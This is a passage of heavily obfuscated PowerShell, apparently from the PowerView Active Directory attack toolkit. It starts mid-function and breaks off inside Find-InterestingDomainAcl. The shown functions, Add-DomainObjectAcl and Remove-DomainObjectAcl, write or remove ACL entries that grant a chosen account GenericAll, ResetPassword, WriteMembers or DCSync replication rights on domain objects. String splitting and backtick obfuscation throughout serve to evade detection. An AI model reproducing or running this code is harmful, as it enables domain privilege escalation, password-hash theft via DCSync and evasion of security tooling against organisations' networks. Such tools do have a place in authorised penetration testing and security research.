                                    if (${_}."N`Ame" -match ((("{6}{13}{10}{12}{2}{9}{5}{7}{0}{1}{4}{8}{3}{11}" -f '{0}Inhe','r','ect','AceT','itedOb','e','ObjectType{','Type','ject','Ac','ri','ype','tedObjectType{0}Obj','0}Inhe'))  -f  [Char]124)) {
                                        try {
                                            ${AcL`prOp`E`RTI`Es}[${_}."NA`ME"] = ${GU`idS}[${_}."vA`LUe".("{1}{0}"-f 'oString','t').Invoke()]
                                        }
                                        catch {
                                            ${aclP`ROP`e`Rt`IES}[${_}."na`ME"] = ${_}."V`ALue"
                                        }
                                    }
                                    else {
                                        ${aC`lpRo`PEr`Ties}[${_}."N`Ame"] = ${_}."Va`LUe"
                                    }
                                }
                                ${o`U`TOBjEct} = &("{1}{2}{3}{0}" -f't','New-O','bj','ec') -TypeName ("{2}{1}{0}"-f'ct','bje','PSO') -Property ${ACLpRoP`ERt`IeS}
                                ${OutOB`Je`ct}."psObj`Ect"."tYP`EN`AmEs".("{0}{1}" -f 'Inse','rt').Invoke(0, ("{1}{0}{2}{3}"-f'werV','Po','iew.','ACL'))
                                ${OUTob`JE`CT}
                            }
                            else {
                                ${_}."Pso`BJE`cT"."ty`pen`Ames".("{0}{1}{2}" -f 'Ins','er','t').Invoke(0, ("{3}{2}{0}{1}" -f 'C','L','ew.A','PowerVi'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{2}{3}{1}{0}"-f 'e','os','Writ','e-Verb') ('[Ge'+'t'+'-DomainObje'+'ct'+'Acl] '+'Err'+'or'+': '+"$_")
                }
            }
        }
    }
}


function ADD`-DoMA`i`NOBjeC`TA`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f'houldPr','PS','ocess','S'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POsITIOn = 0, vaLuefRomPIpELinE = ${t`Rue}, vALUEFroMpipeliNEbypROPeRtYnAmE = ${T`RUE})]
        [Alias({"{3}{1}{2}{4}{0}"-f'ame','i','stingui','D','shedN'}, {"{3}{1}{0}{2}" -f 'Na','nt','me','SamAccou'}, {"{0}{1}" -f 'Na','me'})]
        [String[]]
        ${tA`RgEtiD`eNt`i`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TaRGe`TDOm`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${Ta`Rg`EtLdA`PfIltER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${taR`G`EtsE`ArCHbA`sE},

        [Parameter(manDaTOrY = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pri`Nci`PALI`DenTity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PRiNC`ipALdOmA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}"-f'inCo','nt','roller','Doma'})]
        [String]
        ${SER`VER},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{0}{1}"-f 'O','neLevel'}, {"{1}{0}{2}"-f're','Subt','e'})]
        [String]
        ${Se`ArCH`scOpE} = ("{0}{1}" -f 'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`ULtp`AGEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`Ve`RtIMEli`M`IT},

        [Switch]
        ${tOm`BS`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`d`enTiaL} =  (Get-VariABLe  21gV7e  -vaLueonlY)::"em`Pty",

        [ValidateSet('All', {"{3}{1}{0}{2}" -f 'swo','esetPas','rd','R'}, {"{2}{3}{0}{1}"-f'Member','s','Writ','e'}, {"{0}{1}"-f 'DCSy','nc'})]
        [String]
        ${Ri`Gh`TS} = 'All',

        [Guid]
        ${r`IGHtsg`Uid}
    )

    BEGIN {
        ${TaRG`Et`S`EAR`C`h`eRa`RGumeNTS} = @{
            ("{1}{0}{2}"-f 'e','Properti','s') = ("{1}{2}{3}{0}" -f'ame','distingu','ishe','dn')
            'Raw' = ${t`Rue}
        }
        if (${psbOUNdP`ArA`M`etErS}[("{0}{1}{2}{3}" -f 'Ta','rg','et','Domain')]) { ${taRG`e`TSeA`RcHe`RARg`Um`eNTS}[("{0}{1}{2}" -f'Dom','a','in')] = ${tArg`EtDo`MAIn} }
        if (${psBoU`ND`PA`RaMe`T`erS}[("{3}{2}{1}{0}" -f'r','Filte','AP','TargetLD')]) { ${T`ARgeTsEArCHe`RA`Rgu`mEnts}[("{2}{3}{0}{1}" -f 'Fi','lter','LDA','P')] = ${TA`RGetLD`A`pfI`Lt`ER} }
        if (${psb`O`UN`D`pARAM`ETErS}[("{1}{0}{3}{2}" -f'a','TargetSe','se','rchBa')]) { ${t`ArGEtSE`ARCHer`ARgu`MEn`Ts}[("{1}{2}{0}"-f 'Base','Se','arch')] = ${TArgETsEA`R`C`h`BAsE} }
        if (${PSBOUND`PAra`M`ETe`Rs}[("{1}{0}{2}" -f'er','S','ver')]) { ${taRge`TsE`ArcH`ERaRGume`NTs}[("{0}{1}{2}"-f'S','erve','r')] = ${Se`RV`eR} }
        if (${Psbo`U`N`D`paraMeteRS}[("{0}{2}{1}"-f 'SearchS','pe','co')]) { ${t`Ar`Ge`TSEaR`ChE`RArgU`MENtS}[("{3}{1}{2}{0}"-f 'e','hS','cop','Searc')] = ${Se`ArCh`sCO`PE} }
        if (${PS`BOUNDPar`AM`EtERs}[("{0}{3}{2}{4}{1}"-f 'R','ze','eS','esultPag','i')]) { ${TAR`gETsear`CHeR`ArGUM`e`Nts}[("{2}{1}{0}" -f'Size','ge','ResultPa')] = ${RE`suLTpAGe`si`ze} }
        if (${psBoUn`d`paRAmE`TeRS}[("{3}{1}{4}{2}{0}"-f'mit','er','eLi','S','verTim')]) { ${T`ARgetseARcH`eRa`RgU`me`N`Ts}[("{0}{3}{1}{4}{2}"-f 'Ser','r','imit','ve','TimeL')] = ${sE`RVe`RT`ImELI`MIT} }
        if (${P`sB`O`UNDP`ArAMeterS}[("{1}{0}{2}" -f 'bston','Tom','e')]) { ${taRge`T`Se`Ar`chE`Rarg`UmEntS}[("{1}{3}{0}{2}"-f'on','T','e','ombst')] = ${T`OmB`st`oNe} }
        if (${psbOuN`D`P`Aram`EteRs}[("{2}{0}{1}" -f're','dential','C')]) { ${ta`RgEts`EAr`Ch`ERA`RG`UM`ents}[("{1}{2}{0}"-f 'al','Cr','edenti')] = ${crEd`Ent`i`AL} }

        ${P`RINCIpAL`Se`ArC`heRaRgum`en`Ts} = @{
            ("{2}{1}{0}"-f 'ty','nti','Ide') = ${pr`INcIpa`LI`dEN`TitY}
            ("{1}{2}{0}" -f 'es','Propert','i') = ("{1}{0}{2}{5}{4}{3}" -f 'istinguishednam','d','e,objec','d','i','ts')
        }
        if (${pSbou`ND`parame`T`ERs}[("{3}{1}{0}{2}"-f 'alD','rincip','omain','P')]) { ${PrinCipALSeA`R`cH`erA`Rg`UmEn`TS}[("{1}{0}"-f 'omain','D')] = ${pri`Ncip`Al`doM`AiN} }
        if (${p`SbOunD`paRam`Eters}[("{1}{0}{2}"-f 'v','Ser','er')]) { ${PRin`cI`PaL`s`eAr`C`HEraRGum`EntS}[("{0}{1}" -f 'Se','rver')] = ${s`Er`VEr} }
        if (${PsBO`U`NdPar`AME`TE`Rs}[("{0}{2}{1}{3}"-f 'Se','r','a','chScope')]) { ${PRINc`ipaLSe`ARchERA`RgU`mEnTs}[("{2}{0}{1}"-f 'hSc','ope','Searc')] = ${SEA`RCHs`CoPe} }
        if (${PSbOunD`P`ArAME`T`ERS}[("{1}{0}{3}{2}"-f 'esult','R','ze','PageSi')]) { ${P`R`iNCIpaLSeaRCHE`RaRg`U`meNts}[("{1}{3}{0}{2}"-f'geS','Res','ize','ultPa')] = ${REs`Ul`T`PaGe`Size} }
        if (${psB`OU`N`dp`AraM`etERs}[("{3}{1}{0}{2}"-f'meLimi','Ti','t','Server')]) { ${pRInCi`P`ALSeaR`cH`ERArgUmENts}[("{1}{3}{0}{2}"-f'ime','Se','Limit','rverT')] = ${s`ERv`Er`TimELI`Mit} }
        if (${p`Sbou`ND`par`AMETERS}[("{0}{1}{2}" -f'To','mbsto','ne')]) { ${PriN`CipAlsEa`R`cheR`ArgUmeN`TS}[("{0}{1}"-f'To','mbstone')] = ${t`om`BSt`One} }
        if (${pS`BoUn`DPA`RAm`eteRs}[("{0}{1}{2}"-f'Crede','nti','al')]) { ${PRIn`Ci`pAlsEaRCheR`ArGU`mE`Nts}[("{2}{0}{1}" -f 'edent','ial','Cr')] = ${Cre`d`EnTiaL} }
        ${p`Rin`cIPAlS} = &("{0}{4}{2}{3}{1}"-f'Get-','t','in','Objec','Doma') @PrincipalSearcherArguments
        if (-not ${pRIN`cIPA`Ls}) {
            throw ('Un'+'able '+'to'+' '+'r'+'e'+'solve '+'princi'+'p'+'al:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${TarGET`seAR`c`h`Er`A`RGUmENtS}[("{1}{2}{0}"-f'y','Ide','ntit')] = ${TARg`e`TiDE`N`TItY}
        ${Ta`R`geTs} = &("{0}{5}{2}{4}{3}{1}"-f 'G','ject','ma','b','inO','et-Do') @TargetSearcherArguments

        ForEach (${TaRge`TO`BJ`ECt} in ${Ta`R`getS}) {

            ${I`Nh`ErITanCE`TyPe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f 'N','one')
            ${c`ontR`ol`TYpE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}" -f'Allo','w')
            ${ac`ES} = @()

            if (${rIG`hTs`g`UID}) {
                ${gui`Ds} = @(${RIg`HTSg`UID})
            }
            else {
                ${G`UIDS} = Switch (${RiG`H`TS}) {
                    
                    ("{1}{4}{0}{2}{3}"-f'set','R','Pas','sword','e') { ("{8}{1}{4}{5}{3}{7}{6}{0}{2}"-f'006e05','9','29','-11d0-a7','5','70-246d','8-00aa','6','0029') }
                    
                    ("{2}{0}{1}" -f 'teMembe','rs','Wri') { ("{2}{0}{4}{1}{5}{6}{3}"-f '79','e6-1','bf96','2','c0-0d','1','d0-a285-00aa003049e') }
                    
                    
                    
                    
                    ("{0}{1}"-f 'DC','Sync') { ("{0}{1}{2}{6}{4}{5}{3}{7}" -f '1131','f6','aa-9c07-1','f79f-00c0','d1','-','1','4fc2dcd2'), ("{3}{5}{1}{4}{2}{6}{0}" -f'4fc2dcd2','11d1-f','f-00c','1131f6ad-9','79','c07-','0'), ("{8}{0}{5}{10}{2}{1}{9}{3}{7}{4}{6}" -f 'b76-4','-','2-991a','e','4','44d-','0c','da6','89e95','0facb','4c6')}
                }
            }

            ForEach (${Pr`iNcIP`AlO`BJecT} in ${prINc`ipa`LS}) {
                &("{4}{1}{0}{2}{3}"-f 'te-V','i','erbos','e','Wr') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${Id`enti`Ty} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${P`RInCi`pa`L`oBJEcT}."O`BJEC`TsId")

                    if (${gu`i`ds}) {
                        ForEach (${G`UId} in ${gU`I`DS}) {
                            ${neW`gU`ID} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{0}{1}"-f'G','uid') ${g`UiD}
                            ${a`dRIg`h`Ts} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{3}{1}{0}" -f'dRight','ende','Ex','t')
                            ${Ac`eS} += &("{2}{3}{1}{0}" -f'ject','Ob','New','-') ("{8}{3}{7}{1}{6}{5}{4}{2}{0}{10}{9}"-f'yA','eD','r','m.DirectorySer','o','t','irec','vices.Activ','Syste','essRule','cc') ${i`denT`ITY}, ${Ad`Ri`gH`Ts}, ${c`oNTR`oLT`ype}, ${NEW`gu`ID}, ${inHeRIT`A`N`ceTYpE}
                        }
                    }
                    else {
                        
                        ${A`DRiGh`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}"-f 'icAll','ner','Ge')
                        ${ac`eS} += &("{3}{0}{2}{1}"-f 'w-O','ject','b','Ne') ("{9}{11}{5}{13}{1}{3}{12}{0}{7}{8}{2}{14}{6}{10}{4}"-f'e','Se','o','rvices.','sRule','ct','yAcc','Di','rect','S','es','ystem.Dire','Activ','ory','r') ${i`D`ENTi`TY}, ${A`Drig`hts}, ${CON`Trol`Ty`pe}, ${Inh`Eri`TAnc`e`TYpE}
                    }

                    
                    ForEach (${a`ce} in ${Ac`eS}) {
                        &("{4}{0}{1}{2}{3}"-f 'rit','e-','Ver','bose','W') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${tARge`Te`N`TRy} = ${tarGET`Ob`je`Ct}.("{2}{3}{0}{1}"-f 'ectoryEntr','y','GetD','ir').Invoke()
                        ${TA`RgeT`ent`Ry}."P`SBASE"."opT`I`Ons"."s`eCUriTyMa`s`ks" = ("{1}{0}" -f'l','Dac')
                        ${TaR`G`eteNTrY}."pSb`A`sE"."objE`ctse`C`URitY".("{0}{1}{2}{4}{3}"-f'A','dd','A','sRule','cces').Invoke(${a`cE})
                        ${Targe`T`eN`TRY}."ps`BaSe".("{1}{3}{0}{2}"-f'tCh','C','anges','ommi').Invoke()
                    }
                }
                catch {
                    &("{0}{1}{2}"-f'Write','-Verbo','se') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function rE`M`ove-dO`MaiN`o`BJE`CTAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f'Sho','uldPro','PS','cess'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitIOn = 0, VAlUefrompipELiNE = ${t`Rue}, VALUeFROMpiPeLInEBYProPertyname = ${tR`UE})]
        [Alias({"{1}{2}{3}{0}" -f'e','Dis','tingu','ishedNam'}, {"{2}{0}{3}{1}"-f'cc','tName','SamA','oun'}, {"{1}{0}" -f'ame','N'})]
        [String[]]
        ${taR`GetiD`e`NTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${targeTd`o`M`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'r','ilte','F'})]
        [String]
        ${taRG`E`TLD`AP`Fi`LTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${T`A`R`geTseaRChB`Ase},

        [Parameter(maNdatORY = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRI`NCIp`Alid`e`NtITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${pr`inc`ipAl`d`OMain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{0}{2}{3}"-f'a','om','in','Controller','D'})]
        [String]
        ${S`E`RvER},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{1}"-f'One','Level'}, {"{0}{1}"-f 'Su','btree'})]
        [String]
        ${se`A`RcH`scoPe} = ("{0}{2}{1}" -f'Subt','e','re'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`U`ltpag`e`size} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`Rv`Ert`imeLimIt},

        [Switch]
        ${t`OmBst`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`E`NTiaL} =  $21GV7e::"eM`pTY",

        [ValidateSet('All', {"{4}{0}{1}{3}{2}"-f 'es','et','ord','Passw','R'}, {"{1}{0}{2}" -f'rit','W','eMembers'}, {"{0}{1}"-f 'DC','Sync'})]
        [String]
        ${Ri`g`HTS} = 'All',

        [Guid]
        ${r`iGHTS`Gu`ID}
    )

    BEGIN {
        ${TArgeT`S`EaRcHErar`gum`Ents} = @{
            ("{1}{2}{0}" -f's','Pro','pertie') = ("{1}{0}{2}{4}{3}"-f 'sti','di','ng','e','uishednam')
            'Raw' = ${tR`UE}
        }
        if (${p`SBOUND`PA`RAm`eTe`RS}[("{0}{2}{1}" -f'TargetDo','ain','m')]) { ${TAr`gEtS`eA`RcheraR`GU`MENTS}[("{0}{2}{1}" -f'Do','in','ma')] = ${ta`RGEtd`O`m`Ain} }
        if (${pS`BOU`Nd`paRa`MEt`ErS}[("{0}{2}{1}{3}" -f'Target','lte','LDAPFi','r')]) { ${TarGeTsE`Ar`C`hER`ARg`UmENTS}[("{1}{0}{2}" -f'PFil','LDA','ter')] = ${TARGET`LD`A`PfiLTEr} }
        if (${PsBoUN`dpaRA`MEt`eRs}[("{3}{2}{1}{4}{0}" -f 'archBase','S','et','Targ','e')]) { ${tA`RGeTSE`A`RchERA`RgumENTS}[("{1}{3}{2}{0}" -f 'se','S','rchBa','ea')] = ${tarGet`sEArcHB`A`sE} }
        if (${PSBO`UNDpaR`AmeT`erS}[("{0}{2}{1}"-f'Ser','er','v')]) { ${TAr`gE`Ts`EarcherarG`U`Me`NtS}[("{0}{1}"-f'Serv','er')] = ${s`E`RVER} }
        if (${psBoun`D`pARA`MEtErS}[("{1}{2}{0}" -f 'pe','SearchSc','o')]) { ${targeTS`EaRc`h`e`RaRGUMeNTs}[("{2}{3}{1}{0}"-f 'ope','c','Se','archS')] = ${S`EarcH`sc`OPe} }
        if (${Ps`B`OUNdparam`eTERS}[("{3}{0}{1}{2}" -f'Page','Siz','e','Result')]) { ${Tar`geT`S`e`ArCHe`R`ARG`UmEnTs}[("{0}{3}{2}{1}" -f'Re','e','ageSiz','sultP')] = ${resUl`T`P`A`GEsIzE} }
        if (${P`sB`o`UNdParAmE`T`eRs}[("{4}{2}{0}{1}{3}" -f 'ver','TimeLimi','r','t','Se')]) { ${TARgets`e`Ar`cheRa`Rg`U`meNTs}[("{0}{3}{2}{1}" -f 'Serve','it','m','rTimeLi')] = ${s`ErVE`RtiMeLimIt} }
        if (${p`s`BOUNdpaRAMe`Te`Rs}[("{1}{0}{2}" -f'ombsto','T','ne')]) { ${T`A`R`gEt`sEa`R`CHERargUMEnts}[("{0}{2}{1}"-f'To','one','mbst')] = ${tOm`BSt`ONe} }
        if (${PsBouNd`p`ARA`M`E`TERS}[("{2}{1}{0}" -f'al','redenti','C')]) { ${Ta`RgEtSE`ARCHERar`guM`eNtS}[("{2}{1}{0}"-f'l','dentia','Cre')] = ${CrEdE`N`T`iAl} }

        ${pR`i`NciPAlSear`cH`eRarGumeNTS} = @{
            ("{0}{1}" -f 'I','dentity') = ${Pri`Ncip`A`L`i`dentiTy}
            ("{2}{1}{0}" -f 'perties','o','Pr') = ("{4}{2}{6}{5}{1}{7}{0}{3}"-f'cts','e,ob','sti','id','di','ednam','nguish','je')
        }
        if (${pSbOunDPaRA`Met`E`RS}[("{0}{1}{2}{3}"-f'Pri','ncipalD','o','main')]) { ${PrINcipALs`EAR`ch`er`ArgumeN`Ts}[("{1}{2}{0}" -f 'in','Do','ma')] = ${pRINc`I`paldOm`AiN} }
        if (${P`SBOu`NdpArAmE`TeRs}[("{0}{1}"-f'Ser','ver')]) { ${PRiNcIP`AL`sEArcHer`A`RGu`m`en`TS}[("{0}{1}" -f 'Serve','r')] = ${Se`R`Ver} }
        if (${psb`oUnD`p`ARaM`ETers}[("{1}{2}{0}"-f 'e','SearchSc','op')]) { ${pRInc`I`P`ALSEArchE`R`Arg`UM`e`NTS}[("{1}{0}{2}"-f 'hSc','Searc','ope')] = ${S`EARChSC`O`PE} }
        if (${P`s`Bo`UnDparAMeT`ERS}[("{1}{0}{2}" -f 'i','ResultPageS','ze')]) { ${PriNCIp`AlseaR`CHe`R`ARGUMe`N`TS}[("{1}{3}{2}{0}"-f 'ze','Resul','geSi','tPa')] = ${rEs`Ul`TP`AgES`iZE} }
        if (${Psbo`U`NdpaRA`MeTErS}[("{3}{1}{2}{0}" -f'imeLimit','erv','erT','S')]) { ${princIP`A`lSEA`R`cHERaR`G`UMeNtS}[("{4}{1}{0}{2}{3}" -f 'e','Tim','Limi','t','Server')] = ${serv`er`TimE`lImIt} }
        if (${p`Sbo`Und`PaRaMEteRS}[("{1}{0}{2}"-f 'omb','T','stone')]) { ${p`RiN`c`iP`ALSeAr`ChEra`RgumENtS}[("{0}{1}{2}" -f'Tombst','on','e')] = ${ToM`BSt`oNE} }
        if (${PsBOunD`p`A`Ra`me`TerS}[("{0}{1}{2}" -f 'Cred','entia','l')]) { ${PrIn`C`iPALseA`Rc`hER`Ar`gUMEn`TS}[("{0}{1}{2}{3}"-f 'Creden','t','ia','l')] = ${c`ReD`EnT`IAl} }
        ${PRiN`c`IP`Als} = &("{3}{0}{2}{1}"-f 'ma','t','inObjec','Get-Do') @PrincipalSearcherArguments
        if (-not ${PRiNcI`P`A`LS}) {
            throw ('U'+'nab'+'le '+'t'+'o '+'reso'+'lve '+'p'+'r'+'incipal: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${tarGe`TsEArC`He`Rar`gU`men`TS}[("{1}{0}{2}" -f't','Iden','ity')] = ${TaRgeT`iD`E`NtiTy}
        ${t`ARGEts} = &("{2}{1}{0}{3}{4}"-f'i','et-Doma','G','n','Object') @TargetSearcherArguments

        ForEach (${Ta`RGETo`BJecT} in ${ta`RG`eTs}) {

            ${IN`heRItAnce`T`YPE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f 'N','one')
            ${C`on`TROLTy`pE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}" -f'All','ow')
            ${A`ces} = @()

            if (${r`IGHtsG`U`ID}) {
                ${g`UIDs} = @(${riGh`T`sGUiD})
            }
            else {
                ${gU`iDS} = Switch (${Ri`Gh`Ts}) {
                    
                    ("{0}{2}{1}" -f'Re','rd','setPasswo') { ("{4}{8}{5}{1}{0}{7}{9}{6}{2}{3}"-f '1d0-a','d-1','0','529','0029','6','aa006e','7','9570-24','68-00') }
                    
                    ("{2}{1}{0}" -f 's','ber','WriteMem') { ("{8}{7}{6}{1}{4}{3}{10}{0}{5}{9}{2}"-f'0','e6-11d0-a','e2','0','285-','03','-0d','9c0','bf967','049','0aa') }
                    
                    
                    
                    
                    ("{0}{1}{2}"-f 'DC','Syn','c') { ("{3}{4}{1}{0}{2}{5}" -f'1-f79f-0','7-11d','0c0','1131f6a','a-9c0','4fc2dcd2'), ("{2}{1}{5}{6}{3}{0}{4}" -f'2d','-1','1131f6ad-9c07','c04fc','cd2','1d1-f79','f-00'), ("{7}{5}{3}{4}{0}{8}{9}{1}{2}{6}" -f'0','be','da64','444d-4c62-9','91a-','9e95b76-','0c','8','f','ac')}
                }
            }

            ForEach (${pR`in`cIpaL`oBJ`ect} in ${pR`iNC`IPALs}) {
                &("{2}{3}{0}{1}" -f'te-','Verbose','Wr','i') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${IDe`NtitY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${p`R`i`NCiPaLObJe`ct}."O`Bje`CtSid")

                    if (${G`UidS}) {
                        ForEach (${Gu`Id} in ${GUI`DS}) {
                            ${nEwg`UID} = &("{2}{1}{0}" -f 't','c','New-Obje') ("{0}{1}" -f'Gu','id') ${G`Uid}
                            ${a`D`RiGHtS} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}{3}"-f'de','d','Exten','Right')
                            ${AC`Es} += &("{1}{2}{0}"-f 'ect','New-','Obj') ("{4}{3}{0}{8}{2}{7}{6}{1}{5}"-f'ctory','oryAcces','ervice','m.Dire','Syste','sRule','irect','s.ActiveD','S') ${id`e`Ntity}, ${ADrIgH`Ts}, ${CoNt`Ro`LtYPE}, ${n`EW`guiD}, ${inH`eRI`T`ANCetYPE}
                        }
                    }
                    else {
                        
                        ${a`D`RIgH`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{3}{0}{2}{1}"-f'ne','All','ric','Ge')
                        ${A`CeS} += &("{1}{3}{2}{0}"-f 'ect','New-','j','Ob') ("{1}{3}{6}{7}{0}{5}{4}{2}{8}" -f 'eDirectoryAc','System.D','sRul','ir','es','c','ectorySer','vices.Activ','e') ${I`D`entiTy}, ${a`dr`IgHts}, ${co`NTroLt`YPe}, ${I`NheRItan`cETY`pe}
                    }

                    
                    ForEach (${A`cE} in ${AC`Es}) {
                        &("{0}{1}{2}{3}"-f'W','rit','e-Verbo','se') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${t`ArgE`T`enTRY} = ${T`A`RgEtObjeCT}.("{5}{3}{4}{1}{2}{0}" -f'ry','y','Ent','tDire','ctor','Ge').Invoke()
                        ${ta`Rget`eNtRy}."Ps`B`AsE"."Opt`I`oNs"."Sec`URit`YM`AsKS" = ("{1}{0}" -f'acl','D')
                        ${tAr`GetEn`TrY}."psba`sE"."oBjEc`TsEcu`RITY".("{1}{2}{3}{0}" -f'Rule','Rem','oveAc','cess').Invoke(${a`Ce})
                        ${tARgE`Te`N`TRY}."P`sB`ASE".("{1}{4}{0}{2}{3}" -f 'itChang','C','e','s','omm').Invoke()
                    }
                }
                catch {
                    &("{0}{2}{1}" -f 'Wri','Verbose','te-') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Fi`ND-I`NTEre`sTi`NG`d`oma`INACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{0}{2}{3}" -f'ould','P','P','rocess','SSh'}, '')]
    [OutputType({"{2}{4}{3}{1}{0}"-f 'L','C','P','ew.A','owerVi'})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSItIoN = 0, vAlUEfROmPIpeLinE = ${TR`Ue}, vaLueFrOmPIPeLiNebyprOPERtYnAme = ${Tr`UE})]
        [Alias({"{0}{3}{2}{1}" -f'Dom','ame','N','ain'}, {"{0}{1}" -f'Nam','e'})]
        [String]
        ${DO`ma`iN},

        [Switch]
        ${RESo`Lveg`UidS},

        [String]
        [ValidateSet('All', {"{4}{2}{0}{1}{3}" -f'setP','as','e','sword','R'}, {"{1}{0}{2}"-f'teMember','Wri','s'})]
        ${rIGhts`Filt`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Fi','lter'})]
        [String]
        ${lda`P`FilteR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'A','D','SPath'})]
        [String]
        ${Se`ArC`hB`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{2}{3}{0}" -f 'r','nCont','roll','e','Domai'})]
        [String]
        ${SEr`VeR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{2}{1}{0}" -f 'evel','eL','On'}, {"{0}{1}" -f 'Subt','ree'})]
        [String]
        ${seAR`CH`S`cOpe} = ("{0}{1}" -f'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Es`ULtPAG`EsI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`ER`T`im`EliM`iT},

        [Switch]
        ${tO`m`BST`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`deNtial} =   (  GEt-vaRiablE  ("21G"+"v7e")  -Val)::"EMp`Ty"
    )

    BEGIN {
        ${A`cLArGUMeN`TS} = @{}
        if (${p`Sbo`UNDParA`ME`T`eRS}[("{2}{3}{1}{0}" -f's','GUID','Reso','lve')]) { ${A`cla`RgU`MenTs}[("{1}{0}{2}{3}"-f'eG','Resolv','UI','Ds')] = ${rE`S`oLvegUi`dS} }
        if (${PSb`oU`ND`PARamE`TE`RS}[("{0}{3}{2}{1}" -f 'R','er','Filt','ights')]) { ${a`cLArgumE`Nts}[("{1}{3}{2}{0}"-f'er','Ri','Filt','ghts')] = ${RI`g`HTsf`iltER} }
        if (${P`SBO`Und`P`ArameterS}[("{1}{0}{2}" -f 'te','LDAPFil','r')]) { ${AC`La`R`gU`meNts}[("{0}{2}{1}" -f 'LDAPFil','r','te')] = ${Lda`pF`IltEr} }
        if (${PS`Boundpar`A`METE`RS}[("{1}{0}{2}"-f 'chB','Sear','ase')]) { ${aC`LARgU`mENTS}[("{3}{1}{2}{0}" -f 'ase','earch','B','S')] = ${Searc`H`Ba`Se} }
        if (${P`S`Bo`UnDParAmet`ers}[("{2}{0}{1}" -f'e','r','Serv')]) { ${AcL`ArGuME`NtS}[("{1}{0}"-f 'er','Serv')] = ${SeR`V`eR} }
        if (${pS`B`ouN`DParAmeTeRs}[("{1}{2}{0}" -f'pe','Sear','chSco')]) { ${aCLA`RGUM`EnTs}[("{2}{0}{1}" -f'rc','hScope','Sea')] = ${SEa`R`Chsc`Ope} }
        if (${PSBoUN`DP`A`R`AMeTErS}[("{2}{0}{1}"-f 'tPa','geSize','Resul')]) { ${AcL`AR`GuMe`NtS}[("{1}{3}{2}{0}"-f'e','ResultPag','Siz','e')] = ${r`EsU`LtpaG`ESI`ZE} }
        if (${p`s`B`oUNDpARA`meTeRs}[("{0}{3}{1}{2}" -f'Se','verTimeLim','it','r')]) { ${acl`ArGUme`NTS}[("{3}{0}{1}{2}" -f'erverTim','eLimi','t','S')] = ${sE`RVe`RtI`m`ELiMIt} }
        if (${PSbo`UNdp`A`R`Am`eTeRs}[("{0}{1}{2}"-f 'Tom','bst','one')]) { ${A`CL`A`RG`UmenTS}[("{1}{2}{0}"-f'bstone','T','om')] = ${ToMB`STO`NE} }
